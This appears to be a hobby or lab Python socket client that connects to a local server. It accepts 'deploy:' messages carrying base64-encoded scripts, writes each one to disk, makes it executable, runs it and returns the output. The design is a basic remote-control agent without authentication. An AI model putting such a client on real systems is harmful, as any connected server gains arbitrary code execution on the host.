#!/usr/bin/env python3

import socket
import os
import sys
import select
import base64
import subprocess

def client():
    host = '127.0.0.1'
    port = 12345
    client_socket = None

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))
        print("Client connected to server.")

        while True:
            readable, _, _ = select.select([sys.stdin, client_socket], [], [])

            if sys.stdin in readable:
                command = sys.stdin.readline().strip()
                client_socket.sendall(command.encode())

                if command.lower() in ('exit', 'ggez'):
                    break

            if client_socket in readable:
                try:
                    data = client_socket.recv(4096).decode()
                    if data:
                        if data.startswith("deploy:"):
                            try:
                                _, remote_path, script_content_encoded = data.split(":", 2)
                                script_content = base64.b64decode(script_content_encoded).decode()

                                remote_dir = os.path.dirname(remote_path)
                                os.makedirs(remote_dir, exist_ok=True)

                                with open(remote_path, "w") as f:
                                    f.write(script_content)

                                os.chmod(remote_path, 0o755)

                                process = subprocess.Popen([remote_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                                stdout, stderr = process.communicate()
                                output = stdout.decode() + stderr.decode()
                                client_socket.sendall(output.encode())

                            except Exception as e:
                                error_message = f"Error deploying script: {e}"
                                client_socket.sendall(error_message.encode())

                        else:
                            print(data)  # Print ONLY the output from the server

                    else:
                        print("Server disconnected.")
                        break

                except (ConnectionResetError, BrokenPipeError):
                    print("Server disconnected.")
                    break
                except OSError as e:
                    print(f"A socket error occurred: {e}")
                    break

    except ConnectionRefusedError:
        print("Connection to server refused. Make sure the server is running.")
        return

    finally:
        if client_socket:
            client_socket.close()
            print("Client exiting.")

if __name__ == "__main__":
    client()
